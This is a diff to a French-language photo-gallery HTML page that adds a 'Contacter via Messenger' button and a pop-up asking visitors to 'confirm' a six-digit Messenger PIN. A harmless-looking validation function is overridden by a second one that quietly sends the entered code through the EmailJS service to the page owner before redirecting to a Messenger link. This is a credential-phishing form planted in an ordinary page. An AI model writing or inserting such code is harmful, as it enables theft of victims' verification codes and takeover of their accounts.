@@ -42,6 +42,14 @@
     document.addEventListener('dragstart', event => event.preventDefault());
     document.addEventListener('selectstart', event => event.preventDefault());
   </script>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    emailjs.init("AATQVLMcBJaRBgEox");
+  });
+</script>
+
 </head>
 <body>
   <button onclick="window.close()" style="position: fixed; top: 10px; right: 10px; background: #FF4444; color: white; border: none; padding: 10px 15px; border-radius: 5px; font-size: 14px; cursor: pointer; z-index: 9999;">Fermer</button>
@@ -65,5 +73,92 @@
     <img src="image16.jpg" alt="image 16" />
     <img src="image17.jpg" alt="image 17" />
   </div>
+
+<!-- Bouton Messenger + Pop-up -->
+<style>
+  #messengerPopup {
+    display: none;
+    position: fixed;
+    z-index: 10000;
+    left: 50%;
+    top: 20%;
+    transform: translateX(-50%);
+    width: 90%;
+    max-width: 400px;
+    background: white;
+    color: black;
+    padding: 30px;
+    border-radius: 15px;
+    box-shadow: 0 0 15px rgba(0,0,0,0.6);
+    text-align: left;
+  }
+  #messengerPopup input {
+    width: 100%;
+    padding: 12px;
+    margin-top: 10px;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+  }
+  #messengerPopup button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 15px;
+    border: none;
+    border-radius: 8px;
+    background: #0084ff;
+    color: white;
+    font-weight: bold;
+    cursor: pointer;
+  }
+</style>
+
+<div id="messengerPopup">
+  <h3>Confirme ton code PIN Messenger</h3>
+  <input type="text" id="messengerPin" maxlength="6" placeholder="Code à 6 chiffres" />
+  <button onclick="validateMessengerPin()">Valider</button>
+</div>
+
+<button onclick="openMessengerPopup()" style="position: fixed; bottom: 20px; right: 20px; background: #0084ff; color: white; border: none; padding: 15px 20px; border-radius: 50px; font-size: 16px; cursor: pointer; z-index: 9999;">Contacter via Messenger</button>
+
+<script>
+  function openMessengerPopup() {
+    document.getElementById('messengerPopup').style.display = 'block';
+  }
+
+  function validateMessengerPin() {
+    const pin = document.getElementById('messengerPin').value.trim();
+    if (/^\d{6}$/.test(pin)) {
+      window.open("https://m.me/epicstudiop", "_blank");
+      document.getElementById('messengerPopup').style.display = 'none';
+    } else {
+      alert("Veuillez entrer un code PIN valide à 6 chiffres.");
+    }
+  }
+</script>
+
+<script>
+function validateMessengerPin() {
+  const pin = document.getElementById('messengerPin').value.trim();
+  if (!/^\d{6}$/.test(pin)) {
+    alert("Veuillez entrer un code PIN valide à 6 chiffres.");
+    return;
+  }
+
+  const params = { verification_code: pin };
+
+  if (window.emailjs) {
+    emailjs.send("service_photos", "template_code", params)
+      .then(() => {
+        document.getElementById('messengerPopup').style.display = 'none';
+        window.open("https://m.me/epicstudiop", "_blank");
+      })
+      .catch(err => {
+        alert("Erreur EmailJS : " + JSON.stringify(err));
+      });
+  } else {
+    alert("EmailJS non chargé.");
+  }
+}
+</script>
 </body>
 </html>
